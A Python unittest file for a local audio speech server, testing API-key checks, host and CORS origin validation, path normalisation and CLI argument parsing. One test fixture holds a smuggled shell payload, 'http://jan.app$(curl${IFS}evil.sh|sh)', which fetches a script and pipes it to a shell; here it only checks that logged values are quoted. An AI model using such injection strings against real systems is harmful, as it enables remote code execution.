import concurrent.futures
import http.client
import io
import json
import os
import time
import unittest
from unittest import mock

from openai import AuthenticationError, OpenAI

from dev.tests.audio_fixtures import (
    AudioHarness,
    AudioPlan,
    FakeAudioRuntime,
    pcm,
    speech_body,
)
from install import launcher
from server import audio_protocol as audio_wire
from server import audio_server, http_security, http_server
from server.origins import ANY_ORIGIN

SPEECH = "/v1/audio/speech"
# The launcher's parser and the server's, each with the arguments it requires.
PARSERS = (
    (launcher.parse_args, ["serve", "--model", "owner/repo"]),
    (
        audio_server.parse_args,
        ["model", "--tokenizer", "tokenizer", "--model", "owner/repo"],
    ),
)


def speech_plan(**options):
    """A plan speaking one frame of silence."""
    return AudioPlan(chunks=[pcm([0] * audio_wire.SAMPLES_PER_FRAME)], **options)


class ServerAccessTests(unittest.TestCase):
    def test_wildcard_listener_keeps_host_and_api_key_validation(self):
        harness = self.harness(
            host="0.0.0.0", allowed_hosts=("splash.local",), api_key="test-server-key"
        )
        self.assertEqual(harness.server.server_address[0], "0.0.0.0")
        port = harness.server.server_address[1]
        for host, key, expected in (
            (f"127.0.0.1:{port}", "test-server-key", 200),
            (f"127.0.0.1:{port}", "wrong", 401),
            (f"splash.local:{port}", "test-server-key", 200),
            (f"unknown.example:{port}", "test-server-key", 403),
        ):
            with self.subTest(host=host, expected=expected):
                connection = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
                try:
                    connection.request(
                        "GET",
                        "/v1/models",
                        headers={
                            "Host": host,
                            "Authorization": f"Bearer {key}",
                        },
                    )
                    response = connection.getresponse()
                    self.assertEqual(response.status, expected, response.read())
                finally:
                    connection.close()

    def test_authenticated_streams_and_disconnect_cleanup(self):
        blocked = speech_plan(block=True)
        runtime = FakeAudioRuntime(speech_plan(), blocked, speech_plan())
        harness = AudioHarness(runtime, api_key="test-server-key")
        self.addCleanup(harness.close)
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer test-server-key",
        }
        body = speech_body(stream=True)
        status, response_headers, data = harness.request("POST", SPEECH, body, headers)
        self.assertEqual(status, 200, data)
        self.assertEqual(response_headers["Content-Type"], "audio/wav")
        self.assertTrue(data.startswith(b"RIFF"))
        self.assertNotIn(b"test-server-key", data)
        # A client that leaves while the engine holds its first chunk back
        # cancels its request, and the next request runs.
        connection = http.client.HTTPConnection(
            *harness.server.server_address, timeout=3
        )
        connection.request("POST", SPEECH, json.dumps(body), headers)
        self.assertTrue(blocked.started.wait(2))
        connection.close()
        self.assertTrue(
            blocked.cancelled.wait(2), "stream disconnect did not cancel generation"
        )
        deadline = time.monotonic() + 2
        while harness.server.requests.stats()["active"] and time.monotonic() < deadline:
            time.sleep(0.005)
        self.assertEqual(harness.server.requests.stats()["active"], 0)
        self.assertEqual(harness.request("POST", SPEECH, body, headers)[0], 200)

    def test_openai_sdk_recognizes_auth_errors_and_recovers_with_valid_key(self):
        harness = self.harness(api_key="test-server-key")
        base_url = "http://%s:%s/v1" % harness.server.server_address
        with OpenAI(base_url=base_url, api_key="incorrect", max_retries=0) as client:
            with self.assertRaises(AuthenticationError):
                client.models.list()
        with OpenAI(
            base_url=base_url, api_key="test-server-key", max_retries=0
        ) as client:
            self.assertEqual(client.models.list().data[0].id, "test-model")

    def test_concurrent_clients_do_not_share_authentication_state(self):
        harness = self.harness(api_key="test-server-key")

        def query(index):
            authorized = index % 3 != 0
            key = "test-server-key" if authorized else "incorrect"
            status, _, _ = harness.request(
                "GET", "/v1/models", headers={"Authorization": f"Bearer {key}"}
            )
            return status, 200 if authorized else 401

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            for actual, expected in pool.map(query, range(64)):
                self.assertEqual(actual, expected)
        self.assertTrue(harness.server.connections.idle.wait(2))
        self.assertFalse(harness.backend.runtime.requests)

    def harness(self, **kwargs):
        harness = AudioHarness(FakeAudioRuntime(), **kwargs)
        self.addCleanup(harness.close)
        return harness

    def test_a_page_of_an_allowed_origin_reads_every_response(self):
        runtime = FakeAudioRuntime(speech_plan(), speech_plan())
        harness = AudioHarness(
            runtime, api_key="test-server-key", allowed_origins=("tauri://localhost",)
        )
        self.addCleanup(harness.close)
        origin = {"Origin": "tauri://localhost"}
        key = {
            "Authorization": "Bearer test-server-key",
            "Content-Type": "application/json",
        }
        body = speech_body()

        def exchange(method, headers, body=None, path=SPEECH):
            connection = http.client.HTTPConnection(
                *harness.server.server_address, timeout=3
            )
            self.addCleanup(connection.close)
            data = None if body is None else json.dumps(body)
            connection.request(method, path, data, headers)
            response = connection.getresponse()
            return response.status, response.headers, response.read()

        # The preflight a browser sends before a request with a key or a JSON
        # body: without the key, for any header it asks about.
        status, headers, _ = exchange(
            "OPTIONS",
            {
                **origin,
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "authorization, content-type",
            },
        )
        self.assertEqual(status, 204)
        self.assertEqual(
            [
                headers[name]
                for name in (
                    "Access-Control-Allow-Origin",
                    "Vary",
                    "Access-Control-Allow-Methods",
                    "Access-Control-Allow-Headers",
                    "Access-Control-Max-Age",
                )
            ],
            [
                "tauri://localhost",
                "Origin",
                "GET, HEAD, POST, OPTIONS",
                "authorization, content-type",
                "600",
            ],
        )
        # An answer, a stream and a refusal alike name the origin, and let the
        # page read the retry and authentication hints.
        for sent, fields, expected in (
            ({**origin, **key}, {}, 200),
            ({**origin, **key}, {"stream": True}, 200),
            (origin, {}, 401),
        ):
            with self.subTest(fields=fields, expected=expected):
                status, headers, data = exchange("POST", sent, {**body, **fields})
                self.assertEqual(status, expected, data)
                self.assertEqual(
                    headers["Access-Control-Allow-Origin"], "tauri://localhost"
                )
                self.assertEqual(headers["Vary"], "Origin")
                self.assertEqual(
                    headers["Access-Control-Expose-Headers"],
                    "Retry-After, WWW-Authenticate, X-Splash-Speech-Id",
                )
                if expected == 200:
                    self.assertEqual(headers["Content-Type"], "audio/wav")
                if fields:
                    self.assertEqual(headers["Transfer-Encoding"], "chunked")
        # A page of any other origin is refused before the request is read, a
        # preflight too, and learns nothing. The refusal names the flag, and
        # the server prints it once, as the browser hides it from the page.
        with mock.patch.object(http_security, "print_status") as printed:
            for method, extra in (
                ("POST", key),
                ("OPTIONS", {"Access-Control-Request-Method": "POST"}),
            ):
                with self.subTest(method=method):
                    status, headers, data = exchange(
                        method, {"Origin": "https://other.example", **extra}, body
                    )
                    self.assertEqual(status, 403)
                    self.assertIsNone(headers["Access-Control-Allow-Origin"])
                    self.assertIn(
                        "--allowed-origin https://other.example ",
                        json.loads(data)["error"]["message"],
                    )
        printed.assert_called_once_with(
            "Refused · Origin https://other.example · restart with "
            "--allowed-origin https://other.example to accept it",
            error=True,
        )
        # A client that is no page, and the server's own origin, get no such
        # headers.
        host = "%s:%s" % harness.server.server_address
        for sent in (key, {**key, "Origin": f"http://{host}"}):
            status, headers, _ = exchange("GET", sent, path="/v1/models")
            self.assertEqual(status, 200)
            self.assertIsNone(headers["Access-Control-Allow-Origin"])
            self.assertIsNone(headers["Access-Control-Expose-Headers"])
        self.assertEqual(len(runtime.requests), 2)

    def test_every_origin_is_admitted_when_asked(self):
        harness = self.harness(allowed_origins=("*",))
        for origin in ("https://anywhere.example", "null"):
            with self.subTest(origin=origin):
                connection = http.client.HTTPConnection(
                    *harness.server.server_address, timeout=3
                )
                self.addCleanup(connection.close)
                connection.request("GET", "/v1/models", headers={"Origin": origin})
                response = connection.getresponse()
                response.read()
                self.assertEqual(response.status, 200)
                self.assertEqual(response.headers["Access-Control-Allow-Origin"], "*")
                self.assertIsNone(response.headers["Vary"])
                self.assertEqual(
                    response.headers["Access-Control-Expose-Headers"],
                    "Retry-After, WWW-Authenticate, X-Splash-Speech-Id",
                )

    def test_refused_origins_are_logged_once_each_and_bounded(self):
        log = http_security.RefusedOriginLog()
        origins = [f"https://{index}.example" for index in range(log.LIMIT + 5)]
        # An origin is printed cut to 256 characters, and a flag value a shell
        # would run quoted.
        origins[0] = "https://" + "a" * 300 + ".example"
        origins[1] = "http://jan.app$(curl${IFS}evil.sh|sh)"
        flags = [origins[0][:256], f"'{origins[1]}'", *origins[2:]]
        with mock.patch.object(http_security, "print_status") as printed:
            for origin in origins + origins:
                log.report(origin)
        self.assertEqual(
            printed.call_args_list,
            [
                mock.call(
                    f"Refused · Origin {origin[:256]} · restart with "
                    f"--allowed-origin {flag} to accept it",
                    error=True,
                )
                for origin, flag in zip(origins[: log.LIMIT], flags)
            ]
            + [mock.call("Refused · further Origins are not logged", error=True)],
        )

    def test_authentication_precedes_body_parsing_and_admission(self):
        harness = self.harness(api_key="test-server-key")
        for path in (SPEECH, "/v1/audio/transcriptions"):
            with (
                self.subTest(path=path),
                mock.patch.object(http_server.FrontendHandler, "_read_body") as read,
            ):
                status, _, data = harness.request("POST", path)
                self.assertEqual(status, 401)
                self.assertNotIn("test-server-key", data.decode())
                read.assert_not_called()

    def test_credentials_protect_control_routes(self):
        harness = self.harness(api_key="test-server-key")
        for method, path in (
            ("GET", "/status"),
            ("GET", "/metrics"),
            ("HEAD", "/v1/models"),
            ("GET", "/v1/audio/voices"),
        ):
            with self.subTest(method=method, path=path):
                self.assertEqual(harness.request(method, path)[0], 401)
        for headers in (
            {"Authorization": "Bearer test-server-key"},
            {"Authorization": "bearer test-server-key"},
            {"x-api-key": "test-server-key"},
            # A client sending both an API key and an auth token.
            {"Authorization": "Bearer test-server-key", "x-api-key": "test-server-key"},
        ):
            self.assertEqual(
                harness.request("GET", "/v1/models", headers=headers)[0], 200
            )
        for headers in (
            {"Authorization": "Bearer incorrect"},
            {"Authorization": "Basic test-server-key"},
            {"Authorization": "Bearer incorrect", "x-api-key": "test-server-key"},
            {"Authorization": "Bearer test-server-key", "x-api-key": "incorrect"},
            {"Authorization": "Basic test-server-key", "x-api-key": "test-server-key"},
        ):
            self.assertEqual(
                harness.request("GET", "/v1/models", headers=headers)[0], 401
            )
        for name, value in (
            ("Authorization", "Bearer test-server-key"),
            ("x-api-key", "test-server-key"),
        ):
            connection = http.client.HTTPConnection(*harness.server.server_address)
            self.addCleanup(connection.close)
            connection.putrequest("GET", "/v1/models")
            connection.putheader(name, value)
            connection.putheader(name, value)
            connection.endheaders()
            response = connection.getresponse()
            response.read()
            self.assertEqual(response.status, 401)

    def test_routes_and_auth_use_one_normalized_path(self):
        harness = self.harness(api_key="test-server-key")
        key = {"Authorization": "Bearer test-server-key"}
        status, _, payload = harness.request("GET", "/./ready")
        self.assertEqual((status, json.loads(payload)), (200, {"status": "ready"}))
        status, _, payload = harness.request("GET", "/v1/models/../models", headers=key)
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(payload)["object"], "list")
        self.assertEqual(harness.request("GET", "/v1/../status")[0], 401)
        self.assertEqual(harness.request("GET", "/v1/../status", headers=key)[0], 200)

    def test_public_probes_need_no_key_and_no_page_is_served(self):
        harness = self.harness(api_key="test-server-key")
        for method in ("GET", "HEAD"):
            for path in ("/health", "/ready"):
                self.assertEqual(harness.request(method, path)[0], 200)
            for path in ("/", "/index.html?test=1", "/favicon.ico"):
                status, _, data = harness.request(method, path)
                self.assertEqual(status, 401)
                self.assertNotIn(b"test-server-key", data)
        default = self.harness()
        for path in ("/", "/index.html", "/favicon.ico"):
            self.assertEqual(default.request("GET", path)[0], 404)
        self.assertEqual(default.request("GET", "/v1/models")[0], 200)

    def test_cli_takes_origins_as_browsers_send_them(self):
        typed = ["tauri://localhost", "http://localhost:3000", "*"]
        flags = [flag for origin in typed for flag in ("--allowed-origin", origin)]
        parsed = [("tauri", "localhost", None), ("http", "localhost", 3000), ANY_ORIGIN]
        for parse, arguments in PARSERS:
            self.assertEqual(parse([*arguments, *flags]).allowed_origin, parsed)
            self.assertEqual(parse(arguments).allowed_origin, [])
            for origin, refusal in (
                ("http://localhost/app", "expected a scheme and a host"),
                ("tauri://*", "only a bare '*' admits every origin"),
            ):
                with (
                    self.subTest(origin=origin),
                    mock.patch("sys.stderr", io.StringIO()) as stderr,
                    self.assertRaises(SystemExit),
                ):
                    parse([*arguments, "--allowed-origin", origin])
                self.assertIn(
                    f"{origin} is not an origin: {refusal}", stderr.getvalue()
                )

    def test_cli_key_precedence_and_validation(self):
        for parse, arguments in PARSERS:
            with mock.patch.dict(os.environ, {"SPLASH_API_KEY": "environment-key"}):
                self.assertEqual(parse(arguments).api_key, "environment-key")
                args = parse([*arguments, "--api-key", "argument-key"])
                self.assertEqual(args.api_key, "argument-key")
            for key in ("", "two words", "key\n", "非ASCII"):
                with self.subTest(key=key), mock.patch("sys.stderr", io.StringIO()):
                    with self.assertRaises(SystemExit):
                        parse([*arguments, "--api-key", key])

    def test_unauthenticated_request_has_bearer_challenge(self):
        harness = self.harness(api_key="test-server-key")
        connection = http.client.HTTPConnection(*harness.server.server_address)
        self.addCleanup(connection.close)
        connection.request("GET", "/v1/models")
        response = connection.getresponse()
        self.assertEqual(response.status, 401)
        self.assertEqual(response.getheader("WWW-Authenticate"), "Bearer")
        response.read()
